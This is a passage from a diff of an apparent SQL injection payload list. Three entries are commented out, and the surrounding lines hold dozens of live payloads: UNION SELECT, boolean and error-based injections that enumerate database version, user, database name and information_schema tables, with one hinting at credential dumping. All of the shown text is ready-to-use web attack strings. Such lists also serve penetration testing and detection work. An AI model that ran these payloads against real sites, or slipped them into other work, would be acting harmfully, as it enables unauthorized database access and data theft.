@@ -13978,14 +13978,14 @@ select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,group_concat(concat_ws(0x3a,log
 (select @@version)
 services2_4_3' and substring(version(),1,1)=5/*
 shares' and substring(version(),1,1)='5
-showc;id=-1 union select 1,concat_Ws(0x3a,user(),database(),version()),3,4,5--
-show;type=quest;id=195 union select version() -- 
+## showc;id=-1 union select 1,concat_Ws(0x3a,user(),database(),version()),3,4,5--
+## show;type=quest;id=195 union select version() -- 
 Sleater-Kinney' union select 1,2,3,version() -- 
 smori' and 1=0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,version(),14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55 -- 
 soc.culture.usa' and(1=1)--
 Socerbe'union select 1,2,3,4,5,6,7,concat_ws(0x3a,version(),user(),database()),9,10-- 
 sp09 union select table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from information_schema.tables -- 
-sp;C=01;l=r;ID=-569387325 and 1=2 union select 1,2,3,4,concat_ws(char(58),@@version,user(),database(),@@version_compile_os),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --
+## sp;C=01;l=r;ID=-569387325 and 1=2 union select 1,2,3,4,concat_ws(char(58),@@version,user(),database(),@@version_compile_os),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --
 spectacle union select 1,type from devis -- 
 speed or(1,1)=(select count(0),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))from(information_schema.tables)group by 2)-- 
 SP-G' and 1=1-- 
